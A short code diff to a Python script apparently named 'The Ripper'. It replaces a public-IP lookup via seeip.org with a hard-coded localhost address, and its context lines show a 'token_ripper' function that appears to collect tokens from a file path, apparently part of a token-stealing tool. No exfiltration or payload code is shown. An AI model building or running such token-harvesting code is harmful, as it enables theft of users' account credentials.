@@ -8,8 +8,7 @@ bot_name = "The Ripper"
 
 #   Functions   #
 def getIPAddress():
-    request = requests.get('https://ip4.seeip.org/')
-    return request.content.decode('UTF-8')
+    return "127.0.0.1"
 
 def token_ripper(path):
     tokens = []
